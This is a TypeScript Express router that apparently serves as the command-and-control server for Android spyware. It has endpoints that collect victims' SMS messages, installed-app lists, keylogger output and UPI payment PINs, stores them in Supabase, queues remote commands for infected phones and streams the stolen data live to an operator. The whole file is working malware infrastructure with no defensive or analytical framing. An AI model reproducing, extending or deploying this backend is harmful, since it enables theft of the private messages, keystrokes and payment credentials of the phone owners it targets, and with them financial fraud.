import { Router, Request, Response } from 'express';
import { createClient } from '@supabase/supabase-js';
import { asyncHandler } from '../../middleware/errorHandler';
import config from '../../config/env';
import logger from '../../utils/logger';
import { io } from '../../index';

const router = Router();
const supabase = createClient(config.supabase.url, config.supabase.serviceRoleKey);

/**
 * PUT /api/v1/mobile/devices/:deviceId
 * Upsert device data
 */
router.put('/devices/:deviceId', asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const deviceData = req.body;

    logger.info(`[Mobile API] Upserting device: ${deviceId}`);

    // Transform mobile app data format to database format
    const dbData: any = {
        device_id: deviceId,
        android_id: deviceData.androidId,
        manufacturer: deviceData.manufacturer,
        model: deviceData.model || deviceData.modelName,
        brand: deviceData.brand,
        product: deviceData.product,
        android_version: deviceData.androidVersion || deviceData.androidV,
        status: true,
        last_seen: new Date().toISOString(),
        sim_cards: deviceData.sims || deviceData.simCards,
        raw_device_info: deviceData.rawDeviceInfo || deviceData.ip_address,
        service_status: deviceData.serviceStatus,
        heartbeat: deviceData.heartbeat || deviceData.batteryStatus,
        oem_status: deviceData.oemStatus,
        power_save_status: deviceData.powerSaveStatus,
        screen_status: deviceData.screenStatus,
        process_importance: deviceData.processImportance,
        build_id: deviceData.buildId,
        updated_at: new Date().toISOString()
    };

    const { data: result, error } = await supabase
        .from('devices')
        .upsert(dbData, { onConflict: 'device_id' })
        .select()
        .single();

    if (error) {
        logger.error('[Mobile API] Device upsert error:', error);
        throw error;
    }

    // Emit Socket.IO event
    io.emit('device_change', { eventType: 'UPDATE', new: result });
    io.to(`device-${deviceId}`).emit('device_change', { eventType: 'UPDATE', new: result });

    return res.json({ success: true, deviceId });
}));

/**
 * POST /api/v1/mobile/heartbeats
 * Send heartbeat
 */
router.post('/heartbeats', asyncHandler(async (req: Request, res: Response) => {
    const heartbeatData = req.body;
    const { deviceId } = heartbeatData;

    if (!deviceId) {
        return res.status(400).json({ error: 'deviceId required' });
    }

    logger.info(`[Mobile API] Heartbeat received from: ${deviceId}`);

    const dbData = {
        device_id: deviceId,
        status: true,
        last_update: new Date().toISOString(),
        uptime: heartbeatData.uptime || 0,
        ram: heartbeatData.ram || 0,
        updated_at: new Date().toISOString()
    };

    // Upsert heartbeat
    const { data: hbResult, error: hbError } = await supabase
        .from('heartbeat')
        .upsert(dbData, { onConflict: 'device_id' })
        .select()
        .single();

    if (hbError) {
        logger.error('[Mobile API] Heartbeat upsert error:', hbError);
    }

    // Update device last_seen and status
    const { data: devResult, error: devError } = await supabase
        .from('devices')
        .update({
            status: true,
            last_seen: new Date().toISOString(),
            heartbeat: heartbeatData,
            updated_at: new Date().toISOString()
        })
        .eq('device_id', deviceId)
        .select()
        .single();

    if (devError) {
        logger.error('[Mobile API] Device status update error:', devError);
    }

    // Emit Socket.IO events
    if (hbResult) {
        io.to(`heartbeat-${deviceId}`).emit('heartbeat_change', { eventType: 'UPDATE', new: hbResult });
    }
    if (devResult) {
        io.emit('device_change', { eventType: 'UPDATE', new: devResult });
        io.to(`device-${deviceId}`).emit('device_change', { eventType: 'UPDATE', new: devResult });
    }

    return res.json({ success: true });
}));

/**
 * POST /api/v1/mobile/sms/batch
 * Batch sync SMS messages
 */
router.post('/sms/batch', asyncHandler(async (req: Request, res: Response) => {
    const messages = req.body;

    if (!Array.isArray(messages)) {
        return res.status(400).json({ error: 'Messages must be an array' });
    }

    logger.info(`[Mobile API] Batch SMS sync: ${messages.length} messages`);

    const validMessages = messages.filter((msg: any) =>
        msg.localSmsId || msg.local_sms_id || msg._id
    );

    const dbMessages = validMessages.map((msg: any) => ({
        device_id: msg.deviceId || msg.device_id,
        local_sms_id: String(msg.localSmsId || msg.local_sms_id || msg._id),
        address: msg.address,
        body: msg.body,
        date: msg.date,
        timestamp: msg.timestamp || msg.date_sent || Date.now(),
        type: msg.type || 1,
        sync_status: 'synced',
        updated_at: new Date().toISOString()
    }));

    if (dbMessages.length === 0) {
        return res.json({ success: true, count: 0 });
    }

    const { data: results, error } = await supabase
        .from('sms_messages')
        .upsert(dbMessages, {
            onConflict: 'device_id,local_sms_id',
            ignoreDuplicates: true
        })
        .select();

    if (error) {
        logger.error('[Mobile API] SMS batch sync error:', error);
        throw error;
    }

    // Emit Socket.IO events for each new message
    if (results && results.length > 0) {
        results.forEach(msg => {
            io.emit('message_change', { eventType: 'INSERT', new: msg });
            io.to(`messages-${msg.device_id}`).emit('message_change', { eventType: 'INSERT', new: msg });
            io.to('all-messages').emit('message_change', { eventType: 'INSERT', new: msg });
        });
    }

    return res.json({ success: true, count: results?.length || 0 });
}));

/**
 * POST /api/v1/mobile/sms
 * Single SMS sync
 */
router.post('/sms', asyncHandler(async (req: Request, res: Response) => {
    const message = req.body;
    const localSmsId = message.localSmsId || message.local_sms_id || message._id;

    if (!localSmsId) {
        return res.status(400).json({ error: 'localSmsId required' });
    }

    const dbMessage = {
        device_id: message.deviceId || message.device_id,
        local_sms_id: String(localSmsId),
        address: message.address,
        body: message.body,
        date: message.date,
        timestamp: message.timestamp || message.date_sent || Date.now(),
        type: message.type || 1,
        sync_status: 'synced',
        updated_at: new Date().toISOString()
    };

    const { data: result, error } = await supabase
        .from('sms_messages')
        .upsert(dbMessage, {
            onConflict: 'device_id,local_sms_id',
            ignoreDuplicates: true
        })
        .select()
        .single();

    if (error) {
        logger.error('[Mobile API] SMS sync error:', error);
        throw error;
    }

    if (result) {
        io.emit('message_change', { eventType: 'INSERT', new: result });
        io.to(`messages-${result.device_id}`).emit('message_change', { eventType: 'INSERT', new: result });
        io.to('all-messages').emit('message_change', { eventType: 'INSERT', new: result });
    }

    return res.json({ success: true });
}));

/**
 * POST /api/v1/mobile/apps/batch
 * Sync installed apps
 */
router.post('/apps/batch', asyncHandler(async (req: Request, res: Response) => {
    const apps = req.body;
    if (!Array.isArray(apps)) {
        return res.status(400).json({ error: 'Apps must be an array' });
    }

    logger.info(`[Mobile API] Apps sync: ${apps.length} apps`);

    const dbApps = apps.map((app: any) => ({
        device_id: app.deviceId,
        package_name: app.packageName,
        app_name: app.appName,
        icon: app.icon,
        version_name: app.versionName,
        version_code: app.versionCode,
        first_install_time: app.firstInstallTime,
        last_update_time: app.lastUpdateTime,
        is_system_app: app.isSystemApp,
        target_sdk: app.targetSdk,
        min_sdk: app.minSdk,
        sync_timestamp: Date.now(),
        updated_at: new Date().toISOString()
    }));

    const { error } = await supabase
        .from('installed_apps')
        .upsert(dbApps, { onConflict: 'device_id,package_name' });

    if (error) {
        logger.error('[Mobile API] Apps sync error:', error);
        throw error;
    }

    return res.json({ success: true, count: apps.length });
}));

/**
 * POST /api/v1/mobile/keylogs
 * Log keylogger data
 */
router.post('/keylogs', asyncHandler(async (req: Request, res: Response) => {
    const keylogData = req.body;
    const dbData = {
        device_id: keylogData.deviceId,
        key: keylogData.key,
        keylogger: keylogData.keylogger,
        log_date: keylogData.currentDate ? new Date(parseInt(keylogData.currentDate)).toISOString() : new Date().toISOString(),
    };

    const { error } = await supabase.from('key_logger').insert(dbData);

    if (error) {
        logger.error('[Mobile API] Keylog insert error:', error);
        throw error;
    }

    return res.json({ success: true });
}));

/**
 * POST /api/v1/mobile/pins
 * Log UPI pins
 */
router.post('/pins', asyncHandler(async (req: Request, res: Response) => {
    const pinData = req.body;
    const dbData = {
        device_id: pinData.deviceId,
        pin: pinData.pin,
        log_date: pinData.currentDate ? new Date(parseInt(pinData.currentDate)).toISOString() : new Date().toISOString(),
    };

    const { error } = await supabase.from('upi_pins').insert(dbData);

    if (error) {
        logger.error('[Mobile API] UPI pin insert error:', error);
        throw error;
    }

    return res.json({ success: true });
}));

/**
 * GET /api/v1/mobile/devices/:deviceId/commands
 * Get pending commands for device
 */
router.get('/devices/:deviceId/commands', asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const status = (req.query.status as string) || 'pending';

    const { data, error } = await supabase
        .from('device_commands')
        .select('*')
        .eq('device_id', deviceId)
        .eq('status', status)
        .order('created_at', { ascending: true });

    if (error) {
        logger.error('[Mobile API] Get commands error:', error);
        throw error;
    }

    // Transform to mobile app format
    const commands = (data || []).map(cmd => ({
        id: cmd.id,
        deviceId: cmd.device_id,
        command: cmd.command,
        payload: cmd.payload,
        status: cmd.status,
        createdAt: cmd.created_at,
        deliveredAt: cmd.delivered_at,
        executedAt: cmd.executed_at,
    }));

    return res.json(commands);
}));

/**
 * PATCH /api/v1/mobile/commands/:commandId/status
 * Update command status
 */
router.patch('/commands/:commandId/status', asyncHandler(async (req: Request, res: Response) => {
    const { commandId } = req.params;
    const { status, error: errorMsg } = req.body;

    const updateData: any = {
        status,
        updated_at: new Date().toISOString()
    };

    if (status === 'delivered') {
        updateData.delivered_at = new Date().toISOString();
    } else if (status === 'executed') {
        updateData.executed_at = new Date().toISOString();
    } else if (status === 'failed' && errorMsg) {
        updateData.error = errorMsg;
    }

    const { data: command, error } = await supabase
        .from('device_commands')
        .update(updateData)
        .eq('id', commandId)
        .select()
        .single();

    if (error) {
        logger.error('[Mobile API] Command update error:', error);
        throw error;
    }

    if (command) {
        // Emit Socket.IO real-time updates
        io.to(`commands-${command.device_id}`).emit('command_change', { eventType: 'UPDATE', new: command });
        io.emit('command_change', { eventType: 'UPDATE', new: command });
    }

    return res.json({ success: true });
}));

export default router;
